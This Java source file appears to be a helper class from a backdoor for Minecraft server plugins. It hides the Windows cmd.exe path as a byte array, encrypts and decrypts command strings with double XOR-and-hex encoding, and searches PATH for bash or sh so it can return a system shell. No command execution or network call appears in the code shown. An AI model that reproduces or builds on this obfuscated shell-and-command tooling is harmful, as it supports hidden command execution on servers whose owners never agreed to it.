package com.github.rumoel.bd.minecraft.plugin;

import java.io.File;
import java.nio.charset.StandardCharsets;

import javax.xml.bind.DatatypeConverter;

import org.apache.commons.lang3.SystemUtils;

public class A1 {
	private static final byte[] WINSHELL = new byte[] { 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115,
			116, 101, 109, 51, 50, 92, 99, 109, 100, 46, 101, 120, 101 };
	private static String shell;

	public static void main(String[] args) {
		if (args.length == 3) {
			String input = args[1];
			String key = args[2];

			if (args[0].equals("D")) {
				String decData = decryptXBin(input, key);
				System.err.println(decData);
				decData = decryptXBin(decData, key);
				System.err.println(decData);
			}
			if (args[0].equals("E")) {
				String encData = encryptXBin(input, key);
				encData = encryptXBin(encData, key);
				System.err.println(encData);
			}
		}
	}

	public static String xorString(String string, String keyI) {
		char[] stringAr = string.toCharArray();
		char[] keyAr = keyI.toCharArray();
		for (int i = 0; i < string.length(); i++) {
			stringAr[i] = (char) (stringAr[i] ^ keyAr[i % keyI.length()]);
		}
		return new String(stringAr);
	}

	public static String decryptXBin(String encData, String realKey) {
		return xorString(hex2bin(encData), realKey);
	}

	public static String encryptXBin(String cmd, String realKey) {
		return bin2hex(xorString(cmd, realKey));
	}

	private static String bin2hex(String enc2) {
		return DatatypeConverter.printHexBinary(enc2.getBytes(StandardCharsets.UTF_8));
	}

	private static String hex2bin(String enc2) {
		return new String(DatatypeConverter.parseHexBinary(enc2), StandardCharsets.UTF_8);
	}

	public static String findShell() {
		if (SystemUtils.IS_OS_WINDOWS) {
			return new String(WINSHELL, StandardCharsets.UTF_8);
		}
		if (SystemUtils.IS_OS_LINUX) {
			String path = System.getenv("PATH");
			if (!path.isEmpty()) {
				String[] argss = path.split(":");
				String res;
				res = checkForBash(argss);
				if (res != null) {
					return res;
				}
				res = checkForSh(argss);
				if (res != null) {
					return res;
				}
			}
		}
		return null;
	}

	private static String checkForSh(String[] argss) {
		for (String string : argss) {
			File fileSh = new File(string, "sh");
			if (fileSh.exists()) {
				shell = fileSh.getAbsolutePath();
				return fileSh.getAbsolutePath();
			}
		}
		return null;
	}

	private static String checkForBash(String[] argss) {
		for (String string : argss) {
			File fileBash = new File(string, "bash");
			if (fileBash.exists()) {
				shell = fileBash.getAbsolutePath();
				return fileBash.getAbsolutePath();
			}
		}
		return null;
	}

	public static String getShell() {
		if (shell == null) {
			shell = findShell();
		}
		return shell;
	}

}
